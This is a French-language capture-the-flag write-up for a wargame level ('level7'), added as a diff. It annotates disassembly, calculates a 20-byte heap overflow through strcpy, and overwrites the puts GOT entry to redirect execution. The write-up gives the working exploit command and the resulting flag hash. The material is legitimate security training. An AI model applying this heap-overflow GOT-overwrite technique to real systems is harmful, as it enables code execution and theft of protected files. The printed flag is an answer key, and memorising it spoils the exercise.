@@ -1,0 +1,89 @@
+more:
+	<main>
+		ebp - 0x20 	stack + 0x20
+		[esp + 0x1c] 	= malloc(0x8)	= 0x804a008 		_1_
+		eax = [esp + 0x1c] = _1_
+		[eax] = 0x1  = [_1_] = 0x1
+		[esp] = 0x8
+		eax		= malloc(0x8)	= 0x804a018		_2_
+		edx = eax = _2_
+		eax = [esp + 0x1c] = _1_
+		[eax + 0x4] = edx = _2_						<== _1_ + 0x4 = _2_
+		[esp] = 0x8
+		[esp + 0x18] 	= malloc(0x8)	= 0x804a028		_3_
+		eax = [esp + 0x18]				??? meme operation qu'avant ret de malloc => eax
+		[eax] = 0x2 = [_3_]
+		[esp] = 0x8
+		edx = eax 	= malloc(0x8)	= 0x804a038		_4_
+		eax = [esp + 18] = _3_
+		[eax + 0x4] = [_3_ + 0x4] = edx = _4_				<== _3_ + 0x4 = _4_
+		eax = [ebp + 0xc]	= &arv[0]
+		eax += 0x4		= &arv[1]
+		edx = eax 		= &arv[1]
+		eax = [esp + 0x1c]	= _1_
+		eax = [eax + 0x04]	= _1_ + 0x4x = _2_
+		[esp + 0x4] = edx	= &arv[1]
+		[esp] = eax		= _2_
+		strcpy(_2_,arv[1])
+		eax = [ebp + 0xc]	= &arv[0]
+		eax += 0x8		= &arv[2]
+		eax = [eax]		= arv[2]	
+		edx = eax		= arv[2]
+		eax = [esp + 0x18]	= _3_
+		eax = [eax + 0x4]	= _3_ + 0x4 = _4_
+		[esp + 0x4] = edx	= arv[2]
+		[esp] = eax		= _4_
+		strcpy(_4_, arv[2])
+		edx = 0x80486e9		= "r"				<= .rodata  _5_
+		eax = 0x72000a64	= "/home/user/level8/.pass"	<= .rodata  _6_
+		[esp + 0x4] = edx	= _5_
+		[esp] = eax		= _6_
+		fopen(_5_,_6_)
+		[esp + 0x8] = eax	= ret fopen
+		[esp + 0x4] = 0x44
+		[esp]  0x8049960	= ""	function <c>	<= .rodata 	_7_
+		fgets(_7_,0x44,ret fopen)
+		[esp] = 0x8048703	= "~~"
+		puts(??)
+		return (0);
+
+	<m>
+		printf deja parametre avec %s !!
+
+	
+Donc le but ca serait de modifier l'adresse du call juste apres fgets afin qu'il puisse jump sur l'adresse :0x8048506 qui correspond au chargement des arguments de printf
+Maintenant calculons l'overflow.
+
+Avec le premier strcpy il est possible d'ecraser _3_ et _4_ avec _2_
+le second strcpy prends la value a l'adresse _3_ + 0x4
+
+Donc pour aller ecraser cette value il faut que notre strcpy est une taille 0x28 (_3_) - 0x18 (_2_) + 0x4 (<main+100>:	mov    DWORD PTR [eax+0x4],edx) = 0x14 = 20.
+Donc pour atteindre (offset) la value de _4_, il faut que la longueur de l'argument arv[1] soit de 20 caracteres.
+En ajoutant une adresse a l'offset 20 de arv[1] on pourra modifier le parametre destination du 2e strcpy.
+
+On va utiliser la meme technique dans le precend, c etait a dire qu on va modifier l'appelle d'une fonction dans une lib exterieur.
+Ici puts:
+
+	level7:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049904 R_386_GLOB_DAT    __gmon_start__
+08049914 R_386_JUMP_SLOT   printf
+08049918 R_386_JUMP_SLOT   fgets
+0804991c R_386_JUMP_SLOT   time
+08049920 R_386_JUMP_SLOT   strcpy
+08049924 R_386_JUMP_SLOT   malloc
+08049928 R_386_JUMP_SLOT   puts
+0804992c R_386_JUMP_SLOT   __gmon_start__
+08049930 R_386_JUMP_SLOT   __libc_start_main
+08049934 R_386_JUMP_SLOT   fopen
+
+on va ecrire a l'offset : 0x80499228
+par l'adresse 0x080484f4 ce qui correspond a l'adresse du chargement des parametre de printf dans <m>. (fgets par recuperer la strinf et la retourner l'adresse dans eax.)
+
+
+Je n'etais pas oblige de jump apres le call de la function time !!
+
+./level7 $(python -c 'print "."*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
